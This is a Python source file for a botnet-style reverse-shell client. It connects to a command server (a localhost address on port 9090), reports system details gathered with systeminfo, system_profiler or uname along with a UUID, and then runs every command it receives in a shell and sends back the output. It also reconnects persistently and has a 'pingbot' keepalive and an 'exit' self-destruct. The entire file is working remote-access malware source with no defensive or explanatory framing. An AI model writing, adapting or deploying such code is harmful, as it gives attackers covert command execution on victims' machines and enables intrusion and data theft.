import socket
import subprocess
import sys
import os
import platform
import uuid


OS=platform.system()
SERVER_IP="127.0.0.1"
SERVER_PORT=9090
BUFFER=10240
UUID=uuid.uuid4()
RETRY=True


def COMMEXEC():
	global connected,sock
	while True:
		try:
			COMM_RECV=sock.recv(BUFFER)
			COMM_RECV=COMM_RECV.decode()
			if COMM_RECV!="":
				print(COMM_RECV)
				if COMM_RECV=='exit':
					sock.send(str.encode("[Client] Self Destruct Initiated!"))
					sock.close()
					break
				if COMM_RECV=='pingbot':
					sock.send(str.encode("pingbot"))
				else:
					if COMM_RECV[:2] == 'cd':
						try:
							os.chdir(COMM_RECV[3:])
						except:
							pass
					COMM_SEND = subprocess.Popen(COMM_RECV[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
					OUTPUT = COMM_SEND.stdout.read()
					OUTPUT = str(OUTPUT, "utf-8")
					sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
			else:
				OUTPUT="No output"
				sock.send(str.encode(OUTPUT + str(os.getcwd()) + '> '))
		except:
			sock.close()
			connected=False
			while not connected:
				try:
					sock=socket.socket()
					sock.connect((SERVER_IP,SERVER_PORT))
					connected=True
					try:
						if OS=="Windows":
							ACK=subprocess.getoutput("systeminfo")
						elif OS=="Darwin":
							ACK=subprocess.getoutput("system_profiler")
						else:
							ACK=subprocess.getoutput("uname -a")
						ACK+="\n"
						ACK="UUID: "+str(UUID)+"\n"+ACK
						sock.send(str.encode(ACK + ">>"))
						if sock.recv(BUFFER).decode()=="Received":
							print("Connected")
							connected=True
					except Exception as Errored:
						print("Error Here", Errored)
						
				except:
					connected=False
			print("Here!!!")
			
	print("Exiting")
	connected=False
	exit()

def ACK():
	try:
		if OS=="Windows":
			ACK=subprocess.getoutput("systeminfo")
		elif OS=="Darwin":
			ACK=subprocess.getoutput("system_profiler")
		else:
			ACK=subprocess.getoutput("uname -a")
		ACK+="\n"
		ACK="UUID: "+str(UUID)+"\n"+ACK
		sock.send(str.encode(ACK + ">>"))
		if sock.recv(BUFFER).decode()=="Received":
			COMMEXEC()
	except Exception as Errored:
		print("Error Here", Errored)

connected=False
while not connected:
	try:
		sock=socket.socket()
		sock.connect((SERVER_IP,SERVER_PORT))
		print("Connected")
		connected=True
	except Exception as Exp:
		print("Discon:", Exp)
		sock.close()
		pass
ACK()	
		

